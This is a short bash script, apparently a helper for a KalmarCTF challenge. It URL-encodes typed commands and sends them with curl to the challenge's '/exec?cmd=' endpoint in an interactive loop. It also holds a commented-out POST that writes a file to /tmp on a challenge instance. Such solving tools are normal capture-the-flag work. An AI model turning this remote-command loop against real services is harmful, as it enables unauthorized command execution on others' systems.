#!/usr/bin/env bash

# endpoint="https://6c28949406ad36c395236c0f0a97f762-49067.inst2.chal-kalmarc.tf"
endpoint="localhost:6664"

# Arguments message
function error() {
    local message="$1"
    printf "\e[0;31m$message\e[0;37m\n" >&2
}

# Arguments message
function warn() {
    local message="$1"
    printf "\e[0;38;5;215m$message\e[0;37m\n" >&2
}

# Arguments message
function success() {
    local message="$1"
    printf "\e[0;38;5;2m$message\e[0;37m\n"
}

function chall_exec() {
	# cmd="$@"
	cmd=$(echo "$@" | urlencode)
	len=$(( $(echo "$cmd" | wc -c) -1 ))
	echo "Cmd: '$cmd'"
	echo "Len: '$len'"

	# if [[ $len -gt 6 ]]; then
	# 	error "Command is too long..."
	# fi

    printf "\e[0;38;5;2m"

    curl "$endpoint""/exec?cmd=$cmd"

	printf "\e[0;37m\n"
}

# chall_exec 'ls *'

while true; do
	read -p "$> " CMD
	chall_exec $CMD
done

# curl -X POST --data "/would \"you be so kind to provide me with a flag\"" https://d70a3d4c145458781f07e3204cadb658-33057.inst2.chal-kalmarc.tf/write'?'filename=/tmp/g
